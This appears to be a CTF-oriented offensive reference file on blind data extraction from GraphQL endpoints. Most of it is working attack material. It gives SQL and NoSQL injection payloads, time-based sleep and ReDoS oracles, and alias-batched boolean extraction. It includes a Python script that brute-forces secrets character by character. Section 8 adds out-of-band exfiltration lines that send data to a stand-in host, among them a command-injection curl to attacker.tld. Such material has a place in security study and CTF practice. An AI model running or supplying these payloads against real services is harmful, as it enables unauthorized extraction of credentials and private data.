# Blind GraphQL — extraction when data never returns

When the endpoint suppresses field values, error details, or both, the
response still carries *side channels*: timing, status, response length,
partial-null patterns, and error-vs-success boolean splits. This file covers
blind extraction through GraphQL — both blind *schema* recovery and blind
*data* exfil through injections.

---

## 1. The oracle catalogue

When `data` is suppressed or always `null`, measure:

| Channel | Signal |
|---|---|
| HTTP status | 200 vs 400 vs 500 — branch discriminator |
| Content-Length | response length delta — exists vs not |
| `errors[].message` | different error text per failure mode |
| `errors[].path` | which field ran — even when data hidden |
| Timing | resolver sleep / heavy computation |
| Cache headers | `ETag`, `Age` vary with content |
| `data` shape | `{user:null}` vs `{}` vs absent key — three states |

The cheapest stable oracle is usually the **error-message split**:
`Cannot query field "x"` vs `argument "id" required` distinguishes
exists/not-exists without ever reading data.

## 2. Blind schema recovery — the no-suggestion path

When `did you mean` is stripped, the error-shape oracle still works:

```bash
for name in flag secret token admin users me config; do
  resp=$(curl -s "$BASE/graphql" -H 'Content-Type: application/json' \
    -d "{\"query\":\"{$name}\"}")
  len=${#resp}
  msg=$(echo "$resp" | jq -r '.errors[0].message // "OK"' | head -c80)
  echo "$name: len=$len msg=$msg"
done
```

Three length/message classes — unknown field, wrong-args, success. That is
`introspection-off.md` §3; this file generalizes it to *data* exfil.

## 3. Blind data extraction — boolean oracles

Once an injectable arg reaches a backend query (§injection), boolean exfil:

```graphql
# oracle = presence/absence of the record in data
{ user(name:"x' AND substr((SELECT flag FROM flags LIMIT 1),1,1)='f'-- "){id} }
# data.user = {id:...}  → true branch
# data.user = null       → false branch
```

The response-shape oracle: `"data":{"user":{...}}` vs `"data":{"user":null}` —
one bit per request. Standard SQLi charset-walk applies
(`skills/web-sqli/references/` blind methods).

**Alias-multiplexed blind** — 8 conditions in one request via
`batching-attacks.md`:

```graphql
{
  b1: user(name:"x' AND substr(flag,1,1)>'m'-- "){id}
  b2: user(name:"x' AND substr(flag,1,1)>'t'-- "){id}
  b3: user(name:"x' AND substr(flag,1,1)>'w'-- "){id}
}
```

Each `bN` is an independent boolean — binary search per char in ~7 aliases,
one HTTP request.

## 4. Time-based through GraphQL

Resolver sleep routes:

```graphql
# via SQL sleep inside injection
{ user(name:"x' AND (SELECT CASE WHEN substr(flag,1,1)='f'
         THEN pg_sleep(3) ELSE '1' END)-- "){id} }

# via heavy regex — ReDoS as timing side channel
{ search(q:"^(a+)+$") {id} }

# via $where sleep — mongo
{ users(filter:{ "$where":"sleep(3000); return true" }) {id} }

# via bcrypt-cost tricks on verify mutations
mutation{ verify(code:"x", rounds:31){ok} }
```

Batching compounds it: array elements run concurrently — N timing oracles in
parallel… but shared backend time makes calibration noisy. Prefer sequential
for timing, batched for boolean.

## 5. The null-vs-error oracle — GraphQL-specific

Non-nullable fields create a unique GraphQL oracle: `field: T!` that errors
`Cannot return null for non-nullable` when the resolver returns null vs
`data` when it returns a value. So a *conditional* resolver returning null
gives a clean bit:

```graphql
{flagOnlyIf(cond:"cond-true")}   # declared T!
```

Response discriminates:
- `{"data":{"flagOnlyIf":"..."}}` — condition true
- `{"data":{"flagOnlyIf":null},"errors":["Cannot return null..."]}` — false

Some resolvers let the *argument* drive the condition — then the arg is a
boolean oracle with a clean two-shape response.

## 6. Blind NoSQL extraction — regex oracle

`$regex` filters give a boolean oracle per request, and `$regex` supports
anchored prefixes — character-by-character extraction:

```graphql
{ users(filter:{name:"admin", password:{"$regex":"^f"}}) {id} }       # ^f?
{ users(filter:{name:"admin", password:{"$regex":"^fl"}}) {id} }      # ^fl?
{ users(filter:{name:"admin", password:{"$regex":"^fla"}}) {id} }
{ users(filter:{name:"admin", password:{"$regex":"^flag\\{"}}) {id} }
```

Full method: `skills/web-nosqli/references/blind-extraction-walkthrough.md`.
The alias multiplexing shortcut:

```graphql
{ a:users(filter:{pw:{"$regex":"^a"}}){id}
  b:users(filter:{pw:{"$regex":"^b"}}){id}
  c:users(filter:{pw:{"$regex":"^c"}}){id}
  ... z:users(filter:{pw:{"$regex":"^z"}}){id} }
```

26 aliases = 26 guesses per request — charset position extraction in ~2
requests per char instead of ~13.

## 7. Response-length as the oracle when all else fails

When errors are generic and timing is suppressed, body length still differs:

```bash
# true branch — record returns
{"data":{"u":[{"id":1,"n":"alice","email":"a@b.c"}]}}          # ~180 bytes
# false branch — empty list
{"data":{"u":[]}}                                             # ~14 bytes
```

Calibrate on known-true and known-false first — get both body sizes — then
any guess discriminates by `wc -c`. This is the universal fallback oracle.

## 8. Extraction via DNS/HTTP OOB

When the injection reaches a sink with outbound capability:

```graphql
# sql → outbound
{ user(name:"x' UNION SELECT LOAD_FILE('\\\\attacker.tld\\x')-- "){id} }
# cmdi → outbound
{ ping(host:"x; curl http://attacker.tld/?d=$(id)") }
# $where → outbound
{ users(filter:{"$where":"fetch('http://a.tld/'+this.flag)"}){id} }
# graphql-resolver-side SSRF with data in URL
{ fetch(url:"http://attacker.tld/?d="+secret-path...) }
```

`tools/web/oob_listener.py serve` catches hits — the flag rides the URL.
The OOB route needs an *exfil-capable sink* — see the carrier skill
(`web-sqli`, `web-command-injection`, `web-ssrf`) for which sinks exfil.

## 9. The loop shape for blind walks

```python
#!/usr/bin/env python3
# blind extraction skeleton — boolean oracle per char position
import requests, string, json
URL = "https://target/graphql"
TOK = "..."
def oracle(cond):
    q = '{u(name:"x\' AND %s-- "){id}}' % cond
    r = requests.post(URL, json={"query":q},
                      headers={"Authorization":f"Bearer {TOK}"})
    return '"id"' in r.text

flag = ""
charset = string.ascii_lowercase + string.digits + "_{}-!:"
for pos in range(1, 64):
    lo, hi = 0, len(charset)-1
    while lo < hi:
        mid = (lo+hi)//2
        if oracle(f"substr((SELECT flag FROM flags),{pos},1)>'{charset[mid]}'"):
            lo = mid+1
        else:
            hi = mid
    flag += charset[lo]
    print(flag)
```

Then batch-optimize: replace the sequential binary search with one
alias-multiplexed document per position (`batching-attacks.md`).

## 10. Recording

Blind extraction is slow — record the oracle and charset position so a
restart resumes:

```bash
python3 tools/state.py $CHAL --hypothesis \
  "blind boolean via user.name — extracting flag pos 12: 'flag{part...'"
python3 tools/state.py $CHAL --strategy-used chain_match
```

The flag itself goes through `pre-flag` only when read from a live response —
a blind-extracted flag IS a live-response read, so it qualifies once complete.
